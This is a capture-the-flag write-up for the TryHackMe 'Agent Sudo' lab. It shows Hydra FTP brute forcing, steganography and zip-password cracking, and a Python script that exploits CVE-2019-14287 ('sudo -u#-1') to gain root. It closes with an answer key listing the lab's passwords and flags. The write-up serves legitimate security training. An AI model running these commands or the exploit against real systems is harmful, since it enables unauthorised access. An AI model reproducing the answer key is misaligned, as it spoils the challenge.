---
title: Agent Sudo
date: 2022-09-10 09:45:47 +07:00
modified: 2022-09-10 09:45:47 +07:00
tags: [CVE, Agent Sudo, TryHackMe, Writeup, CTF]
description: You found a secret server located under the deep sea. Your task is to hack inside the server and reveal the truth.
image: https://photos.squarezero.dev/file/abir-images/AgentSudo/logo.png
---

![](https://photos.squarezero.dev/file/abir-images/htbasset/thmbanner.png)

<img src="https://photos.squarezero.dev/file/abir-images/AgentSudo/logo.png" style="margin-left: 20px; zoom: 30%;" align=left />    	<font size="10">Agent Sudo</font>

29<sup>th</sup> OCtober 2019

​		Machine Author(s): [DesKel](https://tryhackme.com/p/DesKel)

### Description: 
You found a secret server located under the deep sea. Your task is to hack inside the server and reveal the truth.

## Recon


I start port scanning with [Nmap]() to find existing ports and services.

`sudo nmap -sC -sV -oA nmap/agentsudo 10.10.133.149`


|Ports|Service
|21|FTP (vsftpd 3.0.3)
|22|SSH (OpenSSH 7.6p1
|80|HTTP (Apache httpd 2.4.29

![](https://photos.squarezero.dev/file/abir-images/AgentSudo/1.png)

I checked website and wants me to change my user-agent

![](https://photos.squarezero.dev/file/abir-images/AgentSudo/02.png)

![](https://photos.squarezero.dev/file/abir-images/AgentSudo/2.png)

## Brute-Force

“25 employees” suggesting letters in the alphabet. So I have decided to brute force using all the letters.

![](https://photos.squarezero.dev/file/abir-images/AgentSudo/2_1.png)
![](https://photos.squarezero.dev/file/abir-images/AgentSudo/2_2.png)

After changing my user name to “C” I got the following message.

![](https://photos.squarezero.dev/file/abir-images/AgentSudo/2_3.png)

![](https://photos.squarezero.dev/file/abir-images/AgentSudo/3.png)

Next, I decided to check out the FTP server. As I don’t have a password, I tried to brute-force using [Hydra]() and with [rockyou.txt]()

`hydra -t 3 -l chris -P /home/sz/Documents/rockyou.txt 10.10.133.149 ftp`

![](https://photos.squarezero.dev/file/abir-images/AgentSudo/4.png)

I got the password to log in FTP.

After logging in I found two .png and one .txt file. After downloading them I checked out the message.

![](https://photos.squarezero.dev/file/abir-images/AgentSudo/5.png)

![](https://photos.squarezero.dev/file/abir-images/AgentSudo/5_1.png)

“stored in the fake picture” suggesting pictures are [Steganography]().

I brute-forced with [Stegcracker]() and found the following text

![](https://photos.squarezero.dev/file/abir-images/AgentSudo/6.png)

![](https://photos.squarezero.dev/file/abir-images/AgentSudo/7.png)

Not very useful. For the other picture, I used [binwalk]() to extract the files inside one of the images.

![](https://photos.squarezero.dev/file/abir-images/AgentSudo/8.png)

I found a zip file and brute-force that with [John]()

![](https://photos.squarezero.dev/file/abir-images/AgentSudo/9.png)

![](https://photos.squarezero.dev/file/abir-images/AgentSudo/10.png)

Now I have the user and password to ssh.

After logging in ssh I found the user flag

![](https://photos.squarezero.dev/file/abir-images/AgentSudo/11.png)

![](https://photos.squarezero.dev/file/abir-images/AgentSudo/12.png)

## OSINT

Inside I found an image 

![](https://photos.squarezero.dev/file/abir-images/AgentSudo/13_1.png)

After a simple google reverse image search, I found this article.

![](https://photos.squarezero.dev/file/abir-images/AgentSudo/13.png)

## Privilege Escalation

After doing some basic enumeration I found a possible shell escaping way. 

![](https://photos.squarezero.dev/file/abir-images/AgentSudo/14.png)

After doing some research I have found the following CVE.

![](https://photos.squarezero.dev/file/abir-images/AgentSudo/15.png)

I made a python file with the following code. 

```python
#!/usr/bin/python3
import os
#Get current username
username = input("Enter current username :")
#check which binary the user can run with sudo
os.system("sudo -l > priv")
os.system("cat priv | grep 'ALL' | cut -d ')' -f 2 > binary")
binary_file = open("binary")
binary= binary_file.read()
#execute sudo exploit
print("Lets hope it works")
os.system("sudo -u#-1 "+ binary)
```

After executing the file I got root!

![](https://photos.squarezero.dev/file/abir-images/AgentSudo/16.png)


 <a href='https://ko-fi.com/N4N64TH56' target='_blank'><img height='36' style='border:0px;height:36px;' src='https://cdn.ko-fi.com/cdn/kofi3.png?v=3' border='0' alt='Buy Me a Coffee at ko-fi.com' /></a>

***Q1. How many open ports?***

***A. 3***

***Q2. How you redirect yourself to a secret page?***

***A. user-agent***

***Q3. What is the agent name?***

***A. chris***

***Q4. FTP password***

***A. crystal***

***Q5. Zip file password***

***A. alien***

***Q6. steg password***

***A. Area51***

***Q7. Who is the other agent (in full name)?***

***A. james***

***Q8. SSH password***

***A. hackerrules!***

***Q9. What is the user flag?***

***A. b03d975e8c92a7c04146cfa7a5a313c7***

***Q10. What is the incident of the photo called?***

***A. Roswell alien autopsy***

***Q11. CVE number for the escalation***

***A. CVE-2019-14287***

***Q12. What is the root flag?***

***A. b53a02f55b57d4439e3341834d70c062***

***Q13. (Bonus) Who is Agent R?***

***A. DesKel***